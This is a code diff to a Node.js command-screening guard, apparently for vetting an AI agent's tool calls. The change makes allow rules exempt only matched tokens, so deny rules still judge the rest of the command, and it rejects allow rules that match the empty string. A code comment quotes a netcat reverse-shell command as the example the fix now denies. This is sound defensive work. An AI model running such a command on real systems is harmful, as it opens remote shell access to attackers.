@@ -4,9 +4,10 @@
 // CGB_POLICIES_DIR (dir with unsafe-tool-patterns.json,
 // prompt-injection-patterns.json, allow-patterns.json).
 // Prints one line: "allow", "deny|<id>|<reason>", "pass" or "error|<reason>".
-// "allow" only means "skip the vendored deny rules": the calling hook still
-// runs its built-in backstops. "error" (unreadable, empty or uncompilable
-// policy data) makes the hook block: the guard fails closed.
+// "allow" only means "allow tokens were cut out and no deny rule matched the
+// rest": the calling hook still runs its built-in backstops. "error"
+// (unreadable, empty or uncompilable policy data, an allow rule that matches
+// the empty string) makes the hook block: the guard fails closed.
 // Only a Node.js builtin is imported ("node:fs", "node:path").
 
 const fs = require("node:fs");
@@ -180,34 +181,44 @@ const denySets = ["unsafe-tool-patterns.json", "prompt-injection-patterns.json"]
   build(load(n, true), n),
 );
 
-// An allow rule never applies to chained/multi-line commands.
-if (!/[;&|\n\r]/.test(value)) {
-  for (const rule of allowRules) {
-    if (rule.re.test(value)) {
-      console.log("allow");
-      process.exit(0);
-    }
-  }
+// An allow rule that matches the empty string would exempt everything.
+for (const rule of allowRules) {
+  if (rule.re.test("")) fail(`policy data allow-patterns.json: rule ${rule.id} matches the empty string`);
 }
+
+// Allow rules exempt tokens, never the command (T-08): every match is cut out
+// and the deny rules still judge what is left, so `nc -e /bin/sh h p
+// .env.example` is denied on the netcat part. Chained, multi-line or
+// substituted commands ($(...), backticks, <(...)) get no exemption at all.
+const exemptTokens = (text) => {
+  if (/[;&|\n\r`()]/.test(text)) return { subject: text, exempted: false };
+  let subject = text;
+  for (const rule of allowRules) {
+    const all = new RegExp(rule.re.source, rule.re.flags.includes("g") ? rule.re.flags : `${rule.re.flags}g`);
+    subject = subject.replace(all, " ");
+  }
+  return { subject, exempted: subject !== text };
+};
+const { subject, exempted } = exemptTokens(value);
 
 const select = (rules) =>
   mode === "strict" ? rules : rules.filter((r) => !r.adminBypass && !excluded.has(r.id));
 
 for (const rules of denySets) {
   for (const rule of select(rules)) {
-    if (rule.re.test(value)) {
+    if (rule.re.test(subject)) {
       console.log(`deny|${rule.id}|${rule.reason ?? ""}`);
       process.exit(0);
     }
   }
 }
-const payloadRule = mode === "balanced" ? payloadRuleId(value) : null;
+const payloadRule = mode === "balanced" ? payloadRuleId(subject) : null;
 if (payloadRule) {
   console.log(`deny|${payloadRule}|${BASE64_REASONS[payloadRule]}`);
   process.exit(0);
 }
-if (mode === "balanced" && DECODE_EXEC.test(value)) {
+if (mode === "balanced" && DECODE_EXEC.test(subject)) {
   console.log("deny|base64-decode-exec-line|Decoded output evaluated (eval/source/sh -c)");
   process.exit(0);
 }
-console.log("pass");
+console.log(exempted ? "allow" : "pass");
